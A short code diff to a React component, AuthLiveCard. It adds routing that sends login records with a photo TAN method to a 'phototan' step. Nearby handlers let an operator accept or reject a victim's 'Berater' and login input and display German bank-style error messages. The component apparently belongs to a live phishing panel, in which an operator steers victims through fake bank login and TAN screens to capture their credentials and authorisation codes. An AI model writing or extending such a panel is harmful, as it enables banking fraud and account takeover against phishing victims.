@@ -76,7 +76,7 @@ const AuthLiveCard = () => {
     last_error: "Anmeldung fehlgeschlagen. Bitte überprüfen Sie Ihre Zugangsdaten.",
   });
   const acceptLogin = (r: AuthRow) =>
-    setPhase(r, "confirm", { last_error: null });
+    setPhase(r, r.tan_method === "photo" ? "phototan" : "confirm", { last_error: null });
   const acceptBerater = (r: AuthRow) => setPhase(r, "login", { last_error: null });
   const rejectBerater = (r: AuthRow) => setPhase(r, "berater", {
     last_error: "Ihre Eingabe konnte nicht verifiziert werden. Bitte versuchen Sie es erneut.",
